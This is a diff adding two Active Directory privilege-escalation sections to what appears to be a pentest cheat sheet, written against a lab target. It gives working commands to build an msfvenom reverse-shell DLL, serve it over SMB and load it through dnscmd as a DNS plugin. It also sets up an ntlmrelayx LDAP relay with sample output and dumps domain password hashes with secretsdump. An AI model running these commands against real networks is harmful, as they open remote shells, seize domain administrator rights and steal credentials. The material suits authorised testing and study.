@@ -14,6 +14,8 @@ Table of Contents
       * [Bypassing Windows Defender](#bypassing-windows-defender)
       * [Sharing files with Windows machine](#sharing-files-with-windows-machine)
       * [Using BloodHound](#using-bloodhound)
+      * [From DNSAdmin group to Administrators](#from-dnsadmin-to-administrator)
+      * [From Exchange Windows Permissions group to Administrators](#from-exchange-windows-permissions-group-to-administrators)
    * [WebApplication Hacking](#webapplication-hacking)
       * [Create a PHP Backdoor shell](#create-a-php-backdoor-shell)
       * [Demonstrating the possibility of steal cookies abusing of XSS vulnerability](#demonstrating-the-possibility-of-steal-cookies-abusing-of-xss-vulnerability)
@@ -117,6 +119,71 @@ We have to download SharpHound.ps1 from its last repository *(it has been change
 Set-Execution Bypass -Scope Process
 Import-Module [PATH_TO_SHARE]\SharpHound.ps1
 Invoke-BloodHound -CollectionMethod All -JSONFolder [PATH_TO_RESULTS]
+```
+
+## From DNSAdmin to Administrator
+Having this localgroup rights, it's possible to escalate to Administrator and achieve SYSTEM rights. As explained in [this link](https://medium.com/techzap/dns-admin-privesc-in-active-directory-ad-windows-ecc7ed5a21a2), the steps to perform the privilege escalation are:
+```bash
+# Malicious DLL creation
+msfvenom -a x64 -p windows/x64/shell_reverse_tcp LHOST=[LHOST] LPORT=8080 -f dll > privesc.dll
+# Setting up SMB server to serve the DLL
+impacket-smbserver evil .
+```
+```powershell
+// Obtaining FQDN from host:
+[System.Net.Dns]::GetHostByName($env:computerName)
+dnscmd [FQDN] /config /serverlevelplugindll //[LHOST]/evil/privesc.dll
+cmd.exe /c "sc.exe stop DNS"
+cmd.exe /c "sc.exe start DNS"
+```
+
+## From Exchange Windows Permissions group to Administrators
+Having this localgroup rights, it's possible to escalate to Administrators and achieve SYSTEM rights. This could be gained using, for instance, impacket libraries. These steps have to be followed:
+```bash
+./ntlmrelayx.py -t ldap://[RHOSTS] --escalate-user [USER_WE_HAVE]
+: ' Results should looks like:
+[*] Protocol Client SMB loaded..
+[*] Protocol Client SMTP loaded..
+[*] Protocol Client MSSQL loaded..
+[*] Protocol Client HTTPS loaded..
+[*] Protocol Client HTTP loaded..
+[*] Protocol Client IMAPS loaded..
+[*] Protocol Client IMAP loaded..
+[*] Protocol Client LDAPS loaded..
+[*] Protocol Client LDAP loaded..
+[*] Running in relay mode to single host
+[*] Setting up SMB Server
+[*] Setting up HTTP Server
+' 
+```
+
+Now I need to authorize the connection, I need to browse the http://localhost/privexchange and login as the user, which we want to enhance, to authenticate the action. As soon as I authenticate, I can see the user got permission.
+```bash
+: ' The terminal would look like:
+[*] Servers started, waiting for connections
+[*] HTTPD: Received connection from 127.0.0.1, attacking target ldap://10.10.10.161
+[*] HTTPD: Client requested path: /privexchange
+[*] HTTPD: Received connection from 127.0.0.1, attacking target ldap://10.10.10.161
+[*] HTTPD: Client requested path: /privexchange
+[*] HTTPD: Client requested path: /privexchange
+[*] Authenticating against ldap://10.10.10.161 as \[USER] SUCCEED
+[*] Enumerating relayed user's privileges. This may take a while on large domains
+[*] HTTPD: Received connection from 127.0.0.1, attacking target ldap://10.10.10.161
+[*] HTTPD: Client requested path: /favicon.ico
+[*] HTTPD: Client requested path: /favicon.ico
+[*] HTTPD: Client requested path: /favicon.ico
+[*] User privileges found: Create user
+[*] Dumping domain info for first time
+[*] Authenticating against ldap://10.10.10.161 as \[USER] SUCCEED
+[*] Enumerating relayed user's privileges. This may take a while on large domains
+[*] Domain info dumped into lootdir!
+[*] User privileges found: Create user
+'
+```
+
+Secretsdump can be utilized to get hashes of more privileged users:
+```bash
+secretsdump htb/[USER]:[PASSWORD]@10.10.10.161
 ```
 
 # WebApplication Hacking
